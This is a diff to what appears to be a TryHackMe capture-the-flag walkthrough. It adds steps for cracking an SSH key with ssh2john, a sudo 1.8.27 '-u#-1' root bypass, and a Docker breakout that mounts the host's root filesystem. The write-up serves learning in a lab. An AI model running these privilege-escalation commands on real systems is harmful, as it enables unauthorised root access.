@@ -239,7 +239,7 @@ We have a the binaries of `base64` tool, this binaries have access to run as `ma
 We conclude from the hint on `tryhackme` site that the flag equals the password of `Maya`...
 
 ---
-#### Robert's Flag
+#### Robert's Passphrase
 The file that has the targets says that there is an ssh script opened from `robert` device so first let's got to the directory called`old ssh`, you will find the ssh file, take it and get the hash of it by `ssh2john`:
 ```bash
 ssh2john {ssh file} > {hash file}
@@ -256,3 +256,32 @@ The listener is on `127.0.0.1:2222`, now ssh to it with the cracked password...
 ```bash
 ssh -p 2222 robert@127.0.0.1
 ```
+---
+
+Now The last thing, when you on `ropert ssh` you will notice that the sudo version is old, you can guess that because you told that the opened `ssh` is old
+```bash
+sudo --version
+``` 
+so there is an exploit for it the exploit: [sudo 1.8.27 - Security Bypass ](https://www.exploit-db.com/exploits/47502).
+Now let's use it to get root permissions...
+```bash
+sudo -u#-1 /bin/bash
+```
+---
+#### The Last Missions
+
+It is a docker privilege escalation task to know more you can read here [Docker prev-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation).
+First lets find the docker...
+```bash
+find / -name docker 2>/dev/null
+```
+The directory is `/tmp/docker` go to `/tmp` and run the docker to list the docker images
+```bash
+./docker images
+```
+Let's get into the image by this command...
+```bash
+/tmp/docker run -it -v /:/host/ mangoman chroot /host/ bash
+```
+
+go to the root and get the last flag of this hard and loooooong room 🎉
